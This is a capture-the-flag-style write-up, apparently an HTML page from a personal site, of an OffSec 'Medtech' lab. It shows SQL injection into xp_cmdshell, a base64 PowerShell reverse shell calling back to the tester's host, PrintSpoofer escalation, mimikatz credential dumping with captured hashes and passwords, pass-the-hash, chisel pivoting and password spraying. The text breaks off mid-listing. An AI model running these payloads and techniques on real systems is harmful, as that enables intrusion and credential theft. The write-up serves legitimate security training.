@@ -1,0 +1,995 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">OffSec Challenge lab1 : Medtech</h1>
+    <p class="text">Difficulty : Easy | CommunityRating : Hard</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <p class="text">Since the targets we can nmap are the three whose IP start from 192, box3-5 are first target.</p>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab1]
+└─$  <u>sudo nmap -p- -sCV $BOX3 --min-rate=10000</u>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 84:72:7e:4c:bb:ff:86:ae:b0:03:00:79:a1:c5:af:34 (RSA)
+|   256 f1:31:e5:75:31:36:a2:59:f3:12:1b:58:b4:bb:dc:0f (ECDSA)
+|_  256 5a:05:9c:fc:2f:7b:7e:0b:81:a6:20:48:5a:1d:82:7e (ED25519)
+80/tcp open  http    WEBrick httpd 1.6.1 (Ruby 2.7.4 (2021-07-07))
+|_http-title: PAW! (PWK Awesome Website)
+|_http-server-header: WEBrick/1.6.1 (Ruby/2.7.4/2021-07-07)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+<p class="text">Box3 opens ssh and http.</p>
+
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab1]
+└─$ <u>sudo nmap -p- -sCV $BOX4 --min-rate-10000</u>
+PORT      STATE  SERVICE       VERSION
+80/tcp    open   http          Microsoft IIS httpd 10.0
+|_http-title: MedTech
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+135/tcp   open   msrpc         Microsoft Windows RPC
+139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open   microsoft-ds?
+5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+18539/tcp closed unknown
+47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open   msrpc         Microsoft Windows RPC
+49665/tcp open   msrpc         Microsoft Windows RPC
+49666/tcp open   msrpc         Microsoft Windows RPC
+49667/tcp open   msrpc         Microsoft Windows RPC
+49668/tcp open   msrpc         Microsoft Windows RPC
+49669/tcp open   msrpc         Microsoft Windows RPC
+49670/tcp open   msrpc         Microsoft Windows RPC
+49671/tcp open   msrpc         Microsoft Windows RPC</code></pre></div>
+
+<p class="text">Box4 opens http, SMB, and WinRM ports mainly. It would be the place we can get first access to the domain.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab1/box5]
+└─$ <u>sudo nmap -p- -sCV $BOX5 --min-rate=10000</u>
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 60:f9:e1:44:6a:40:bc:90:e0:3f:1d:d8:86:bc:a9:3d (ECDSA)
+|_  256 24:97:84:f2:58:53:7b:a3:f7:40:e9:ad:3d:12:1e:c7 (ED25519)
+1194/tcp open  openvpn?</code></pre></div>
+
+<p class="text">This target only opens ssh and openvpn, which might not allow us to access without credential.</p>
+
+<p class="text">For now, we've collected basic information about open ports. Let's get start penetration test.</p>
+
+
+<h2 class="subtitle">First Access : Reverse shell from box4</h2>
+<div class="img">
+    <img src="{% static 'EthHack/images/medtech/1.png' %}" alt="">
+    <p class="text">There are several tabs we can visit, but there is no interesting information. But pressing top right button, we can jump to a login page.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/medtech/2.png' %}" alt="">
+    <p class="text">Logon page is always connected to database. If we can perform SQL injection, we might be able to get reverse shell. Let's test it.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/medtech/3.png' %}" alt="">
+    <p class="text">Entering ', error messages appeared. This error message suggests we can perform stacked query. We can terminate the string with ; and write new statement we want to execute.</p>
+</div>
+
+<div class="code-box"><pre><code>'; EXEC master..xp_dirtree "\\192.168.45.226\test"; --</code></pre></div>
+<p class="text">Entering above string to username input, I could get below response from the target machine.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab1/box5]
+└─$ <u>sudo responder -I tun0 -v</u>                               
+[sudo] password for kali: 
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.5.0
+
+[SMB] NTLMv2-SSP Client   : 192.168.190.121
+[SMB] NTLMv2-SSP Username : MEDTECH\WEB02$
+[SMB] NTLMv2-SSP Hash     : WEB02$::MEDTECH:42e65b4562abfd12:E0EACD19BE9A50B07C750B933EA25106:0101000000000000003A7FBB9756DC019C110C73F7F1FD830000000002000800320046004E00410001001E00570049004E002D003200460045004800310042005900410056004100460004003400570049004E002D00320046004500480031004200590041005600410046002E00320046004E0041002E004C004F00430041004C0003001400320046004E0041002E004C004F00430041004C0005001400320046004E0041002E004C004F00430041004C0007000800003A7FBB9756DC0106000400020000000800300030000000000000000000000000300000D8C929A18F8306528B604AC0F3F091C5301C8C3D9D4689B5C867902E15F0F4230A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200320036000000000000000000                                        
+[SMB] NTLMv2-SSP Client   : 192.168.190.121
+[SMB] NTLMv2-SSP Username : MEDTECH\WEB02$
+[SMB] NTLMv2-SSP Hash     : WEB02$::MEDTECH:d2d41d340c747d9d:2EDE77743B826C38844ED7F45C8A6162:0101000000000000003A7FBB9756DC01FA7B8C06C92FEA190000000002000800320046004E00410001001E00570049004E002D003200460045004800310042005900410056004100460004003400570049004E002D00320046004500480031004200590041005600410046002E00320046004E0041002E004C004F00430041004C0003001400320046004E0041002E004C004F00430041004C0005001400320046004E0041002E004C004F00430041004C0007000800003A7FBB9756DC0106000400020000000800300030000000000000000000000000300000D8C929A18F8306528B604AC0F3F091C5301C8C3D9D4689B5C867902E15F0F4230A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200320036000000000000000000                                        
+[SMB] NTLMv2-SSP Client   : 192.168.190.121
+[SMB] NTLMv2-SSP Username : MEDTECH\WEB02$
+[SMB] NTLMv2-SSP Hash     : WEB02$::MEDTECH:7a8b56b4015effa4:F527E22CF48B71C840400052D8940151:0101000000000000003A7FBB9756DC017C8D42B73A30AFC30000000002000800320046004E00410001001E00570049004E002D003200460045004800310042005900410056004100460004003400570049004E002D00320046004500480031004200590041005600410046002E00320046004E0041002E004C004F00430041004C0003001400320046004E0041002E004C004F00430041004C0005001400320046004E0041002E004C004F00430041004C0007000800003A7FBB9756DC0106000400020000000800300030000000000000000000000000300000D8C929A18F8306528B604AC0F3F091C5301C8C3D9D4689B5C867902E15F0F4230A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200320036000000000000000000 </code></pre></div>
+<p class="text">However, I couldn't crack these NTLMv2 hashes, so I decided to receive reverse shell from the target using xp_cmdlet.</p>
+<p class="text">First, I need to enable the function inputting below command.</p>
+<div class="code-box"><pre><code>'; enable_xp_cmdshell; -- - </code></pre></div>
+<p class="text">I grabed below code from <a href="https://www.revshells.com/">revshell.com</a>, and entered onto the username input.</p>
+<div class="code-box"><pre><code>'; exec xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA2ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==</code></pre></div>
+<p class="text">Then, I got reverse shell from the target.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab1/box5]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.226] from (UNKNOWN) [192.168.190.121] 57321
+whoami
+nt service\mssql$sqlexpress
+PS C:\Windows\system32> </code></pre></div>
+
+<p class="text">We got first connection.</p>
+
+
+<h2 class="subtitle">LateralMovement : </h2>
+
+<div class="code-box"><pre><code>PS C:\> whoami
+nt service\mssql$sqlexpress
+PS C:\> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled</code></pre></div>
+
+<p class="text">We have SeImpersonatePrivilege, so we can abuse this privilege and get Authority account.</p>
+<p class="text">For that purpose, we can use PritSpoofer64.exe.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows]
+└─$ impacket-smbserver share . -smb2support -username a -password a
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed</code></pre></div>
+
+<div class="code-box"><pre><code>PS C:\temp> net use \\192.168.45.226\share /user:a a
+The command completed successfully.
+
+PS C:\temp> copy \\192.168.45.226\share\PrintSpoofer\PrintSpoofer64.exe
+PS C:\temp> dir
+
+
+    Directory: C:\temp
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----         12/7/2021   4:57 AM          27136 PrintSpoofer64.exe   </code></pre></div>
+
+<div class="code-box"><pre><code>PS C:\temp> .\PrintSpoofer64.exe -i -c powershell
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\system32> 
+PS C:\temp> whoami
+nt service\mssql$sqlexpress</code></pre></div>
+
+<p class="text">It seems to be successfull, but the user didn't change. Since it says CreateProcessAsUser() ok, the task might be open on the other command shell. Therefore, we can trigger reverse shell like before.</p>
+<div class="code-box"><pre><code>PS C:\temp> .\PrintSpoofer64.exe -i -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA2ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='</code></pre></div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.226] from (UNKNOWN) [192.168.190.121] 57329
+whoami
+nt authority\system
+PS C:\Windows\system32> </code></pre></div>
+
+<p class="text">We've upgraded our user.</p>
+<p class="text">Before move on, let's collect informatino about the domain user and local user.</p>
+<div class="code-box"><pre><code>PS C:\Windows\system32> net user
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           Guest                    
+offsec                   WDAGUtilityAccount       
+The command completed with one or more errors.
+
+PS C:\Windows\system32> net user /domain
+The request will be processed at a domain controller for domain medtech.com.
+
+
+User accounts for \\DC01.medtech.com
+
+-------------------------------------------------------------------------------
+Administrator            Guest                    joe                      
+krbtgt                   leon                     mario                    
+offsec                   peach                    wario                    
+yoshi                    
+The command completed with one or more errors.</code></pre></div>
+
+<p class="text">Then, we can extract all passwords and hashes stored on the local machine with mimikatz.exe.</p>
+<p class="text">Install it with impacket-smbserver like before and use it.</p>
+
+<div class="code-box"><pre><code>PS C:\Windows\system32> copy \\192.168.45.226\share\mimikatz.exe 
+PS C:\Windows\system32> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > mimikatz.txt
+PS C:\Windows\system32> copy mimikatz.txt \\192.168.45.226\share
+PS C:\Windows\system32> </code></pre></div>
+<p class="text">I out filed output from mimikatz to mimikatz.txt and copied to my local machine to see anytime and analyze it.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab1]
+└─$ cat mimikatz.txt
+...
+[00000003] Primary
+         * Username : <u>Administrator</u>
+         * Domain   : WEB02
+         * NTLM     : <u>b2c03054c306ac8fc5f9d188710b0168</u>
+         * SHA1     : 14260fbb8c532d874a11696bcb3ee176120c0875
+        tspkg :
+        wdigest :
+         * Username : Administrator
+         * Domain   : WEB02
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : WEB02
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+...
+
+         [00000003] Primary
+         * Username : joe
+         * Domain   : MEDTECH
+         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
+         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
+         * DPAPI    : 58de53296298ce0f98087ae902c88735
+        tspkg :
+        wdigest :
+         * Username : joe
+         * Domain   : MEDTECH
+         * Password : (null)
+        kerberos :
+         * Username : <u>joe</u>
+         * Domain   : <u>MEDTECH.COM</u>
+         * Password : <u>Flowers1</u>
+        ssp :
+        credman :
+        cloudap :</code></pre></div>
+
+        <p class="text">We pwned BOX4 whose hostname is WEB02.</p>
+        <p class="text">Also we found the user credential of domain user joe.</p>
+
+<h2 class="subtitle">Pivoting and Proxychain</h2>
+<p class="text">Since we got access to the domain, we can pivot other non-reachable boxes whose IPs start from 172.</p>
+<p class="text">Let's observe the domain structure using evil-winrm and logon to the BOX4 with administrator with PTH.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows]
+└─$ <u>evil-winrm -i 192.168.190.121 -u administrator -H b2c03054c306ac8fc5f9d188710b0168</u>
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> </code></pre></div>
+
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\Administrator\Documents> arp -a
+
+Interface: 192.168.190.121 --- 0x2
+  Internet Address      Physical Address      Type
+  192.168.190.254       00-50-56-ab-c3-ae     dynamic
+  192.168.190.255       ff-ff-ff-ff-ff-ff     static
+  224.0.0.22            01-00-5e-00-00-16     static
+  224.0.0.251           01-00-5e-00-00-fb     static
+  224.0.0.252           01-00-5e-00-00-fc     static
+  239.255.255.250       01-00-5e-7f-ff-fa     static
+
+Interface: 172.16.190.254 --- 0x5
+  Internet Address      Physical Address      Type
+  <u>172.16.190.10</u>         00-50-56-ab-b3-07     dynamic
+  <u>172.16.190.11</u>         00-50-56-ab-20-0e     dynamic
+  <u>172.16.190.12</u>         00-50-56-ab-1c-37     dynamic
+  <u>172.16.190.13</u>         00-50-56-ab-1a-bc     dynamic
+  <u>172.16.190.14</u>         00-50-56-ab-ec-fd     dynamic   
+  <u>172.16.190.82</u>         00-50-56-ab-61-e8     dynamic
+  <u>172.16.190.83</u>         00-50-56-ab-4d-7e     dynamic
+  172.16.190.255        ff-ff-ff-ff-ff-ff     static
+  224.0.0.22            01-00-5e-00-00-16     static
+  224.0.0.251           01-00-5e-00-00-fb     static
+  224.0.0.252           01-00-5e-00-00-fc     static
+  239.255.255.250       01-00-5e-7f-ff-fa     static</code></pre></div>
+
+  <p class="text">We can access to these boxes using chisel.</p>
+
+  <div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\Administrator\Documents> <u>.\chisel.exe client 192.168.45.226:8001 R:socks</u>
+chisel.exe : 2025/11/15 22:58:25 client: Connecting to ws://192.168.45.226:8001
+    + CategoryInfo          : NotSpecified: (2025/11/15 22:5...168.45.226:8001:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+2025/11/15 22:58:25 client: Connected (Latency 78.3417ms)
+
+┌──(kali㉿kali)-[~/utils/Linux]
+└─$ <u>./chisel server -p 8001 --reverse</u>
+2025/11/16 01:56:40 server: Reverse tunnelling enabled
+2025/11/16 01:56:40 server: Fingerprint f5llGo6SVkwuqRh5QbnZA03OKbjfRHc1xKx31lwCPys=
+2025/11/16 01:56:40 server: Listening on http://0.0.0.0:8001
+2025/11/16 01:58:20 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening</code></pre></div>
+
+<h2 class="subtitle">Proxychain Enumeration</h2>
+
+<p class="text">Since we cannot use nmap with boxes we got access by pivoting, we have to assume or predict open ports.</p>
+<p class="text">It sounds crazy, but remember. The target is Active Directory, and the applications we need to penetrate are minimal. For instance, SMB and winrm. If the target is WEB server, Postgres, MSSQL, MySQL servers.</p>
+<p class="text">Also, if there is no open SMB and WinRM, we can predits the machine uses Linux as OS. </p>
+<p class="text">With considering these, let's collect information.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows]
+└─$<u> proxychains4 crackmapexec smb 172.16.190.10-14 -u joe -p 'Flowers1'</u>
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+SMB         172.16.190.12   445    DEV04            [*] Windows Server 2022 Build 20348 x64 (name:DEV04) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.190.11   445    FILES02          [*] Windows Server 2022 Build 20348 x64 (name:FILES02) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.190.13   445    PROD01           [*] Windows Server 2022 Build 20348 x64 (name:PROD01) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.190.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:medtech.com) (signing:True) (SMBv1:False)
+SMB         172.16.190.11   445    FILES02          [+] medtech.com\joe:Flowers1 <u>(Pwn3d!)</u>
+SMB         172.16.190.13   445    PROD01           [+] medtech.com\joe:Flowers1 
+SMB         172.16.190.12   445    DEV04            [+] medtech.com\joe:Flowers1 
+SMB         172.16.190.10   445    DC01             [+] medtech.com\joe:Flowers1 
+                                                                                                                                 
+┌──(kali㉿kali)-[~/utils/Windows]
+└─$ <u>proxychains4 crackmapexec smb 172.16.190.82-83 -u joe -p 'Flowers1'</u>
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+SMB         172.16.190.82   445    CLIENT01         [*] Windows 11 Build 22000 x64 (name:CLIENT01) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.190.83   445    CLIENT02         [*] Windows 11 Build 22000 x64 (name:CLIENT02) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.190.82   445    CLIENT01         [+] medtech.com\joe:Flowers1 
+SMB         172.16.190.83   445    CLIENT02         [+] medtech.com\joe:Flowers1 </code></pre></div>
+<p class="text">On the .14, there is no SMB.</p>
+
+<p class="text">Then, you notice all of them have SMB open ports, also the user joe has valid credenial.</p>
+<p class="text">Next let's check if WinRm are open.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows]
+└─$ <u>proxychains4 crackmapexec winrm 172.16.190.10-14</u>                     
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+SMB         172.16.190.11   5985   FILES02          [*] Windows Server 2022 Build 20348 (name:FILES02) (domain:medtech.com)
+HTTP        172.16.190.11   5985   FILES02          [*] http://172.16.190.11:5985/wsman
+SMB         172.16.190.10   5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:medtech.com)
+HTTP        172.16.190.10   5985   DC01             [*] http://172.16.190.10:5985/wsman
+SMB         172.16.190.12   5985   DEV04            [*] Windows Server 2022 Build 20348 (name:DEV04) (domain:medtech.com)
+HTTP        172.16.190.12   5985   DEV04            [*] http://172.16.190.12:5985/wsman
+SMB         172.16.190.13   5985   PROD01           [*] Windows Server 2022 Build 20348 (name:PROD01) (domain:medtech.com)
+HTTP        172.16.190.13   5985   PROD01           [*] http://172.16.190.13:5985/wsman
+                                                                                                                                 
+┌──(kali㉿kali)-[~/utils/Windows]
+└─$ <u>proxychains4 crackmapexec winrm 172.16.190.82-83</u>
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+SMB         172.16.190.83   5985   CLIENT02         [*] Windows 11 Build 22000 (name:CLIENT02) (domain:medtech.com)
+HTTP        172.16.190.83   5985   CLIENT02         [*] http://172.16.190.83:5985/wsman</code></pre></div>
+
+<p class="text">IP 14 and 8 don't have winrm port. But others have open one.</p>
+<p class="text">Since the target .14 does not have any fundamental Domain requirement, we can conclude it's Linux server.</p>
+<p class="text">Let's check if there is open ssh port.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab1]
+└─$<u> proxychains4 nc -nv 172.16.190.14 22</u>
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+(UNKNOWN) [172.16.190.14] 22 (ssh) open : Operation now in progress
+<u>SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1</u></code></pre></div>
+
+
+<h2 class="subtitle">Summary</h2>
+<table>
+    <thead>
+        <tr>
+            <th>Port</th>
+            <th>Hostname</th>
+            <th>Open Service</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>192.168.xxx.10</td>
+            <td>DC01</td>
+            <td>SMB, WinRM</td>
+        </tr>
+        <tr>
+            <td>192.168.xxx.11</td>
+            <td>FILES02</td>
+            <td>SMB, WinRM</td>
+        </tr>
+        <tr>
+            <td>192.168.xxx.12</td>
+            <td>DEV04</td>
+            <td>SMB, WinRM</td>
+        </tr>
+        <tr>
+            <td>192.168.xxx.13</td>
+            <td>PROD01</td>
+            <td>SMB, WinRM</td>
+        </tr>
+        <tr>
+            <td>192.168.xxx.14</td>
+            <td>???</td>
+            <td>SSH</td>
+        </tr>
+        <tr>
+            <td>192.168.xxx.82</td>
+            <td>CLINET01</td>
+            <td>SMB</td>
+        </tr>
+        <tr>
+            <td>192.168.xxx.83</td>
+            <td>CLIENT02</td>
+            <td>SMB, WinRM</td>
+        </tr>
+    </tbody>
+</table>
+
+<p class="text">Credential : joe : Flowers1</p>
+<p class="text">Joe -> pwn .11(FILES02)</p>
+
+
+<p class="text">Using these information, let's go futher deeper.</p>
+
+
+<h2 class="subtitle">.11</h2>
+<p class="text">Since the user joe is dominant user in FILES02, it would be easy one.</p>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\joe\documents> dir
+
+
+    Directory: C:\Users\joe\documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         10/4/2022   5:21 PM        2088640 fileMonitorBackup.log</code></pre></div>
+
+<p class="text">We have backupfile.</p>
+
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\joe\documents> type fileMonitorBackup.log | findstr NTLM
+   88934 Oct 04 11:21  Backup      daisy                        6872 Backup Completed. NTLM: abf36048c1cf88f5603381c5128feb8e
+   88605 Oct 04 11:21  Backup      toad                         6872 Backup Completed. NTLM: 5be63a865b65349851c1f11a067a3068
+   88137 Oct 04 11:21  Backup      wario                        6872 Backup Completed. NTLM: fdf36048c1cf88f5630381c5e38feb8e
+   87139 Oct 04 11:21  Backup      goomba                       6872 Backup Completed. NTLM: 8e9e1516818ce4e54247e71e71b5f436</code></pre></div>
+
+   <p class="text">We got several NTLM, and the one for wario could be decoded : Mushroom!</p>
+   
+
+<h2 class="subtitle">Enumeration 3</h2>
+<p class="text">Since we got several hashes and password, we can use it for password spraying.</p>
+<p class="text">Since we haven't pwned .10, .12, .13, .82, .84, the spray targets are them.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab1]
+└─$ cat IPs            
+172.16.190.10
+172.16.190.12
+172.16.190.13
+172.16.190.82
+172.16.190.83
+                                                                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/tempo/lab1]
+└─$ cat passwords.txt
+Flowers1
+Mushroom!
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/lab1]
+└─$ cat users.txt    
